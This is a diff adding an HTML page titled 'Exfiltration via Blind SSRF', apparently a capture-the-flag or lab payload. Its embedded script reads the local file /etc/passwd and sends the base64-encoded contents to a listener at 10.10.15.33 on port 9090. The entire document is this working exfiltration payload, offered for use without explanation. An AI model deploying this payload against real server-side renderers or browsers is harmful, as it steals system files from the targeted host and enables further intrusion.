@@ -1,0 +1,19 @@
+<html>
+    <body>
+        <b>Exfiltration via Blind SSRF</b>
+        <script>
+        var readfile = new XMLHttpRequest(); // Read the local file
+        var exfil = new XMLHttpRequest(); // Send the file to our server
+        readfile.open("GET","file:///etc/passwd", true);
+        readfile.send();
+        readfile.onload = function() {
+            if (readfile.readyState === 4) {
+                var url = 'http://10.10.15.33:9090/?data='+btoa(this.response);
+                exfil.open("GET", url, true);
+                exfil.send();
+            }
+        }
+        readfile.onerror = function(){document.write('<a>Oops!</a>');}
+        </script>
+     </body>
+</html> 
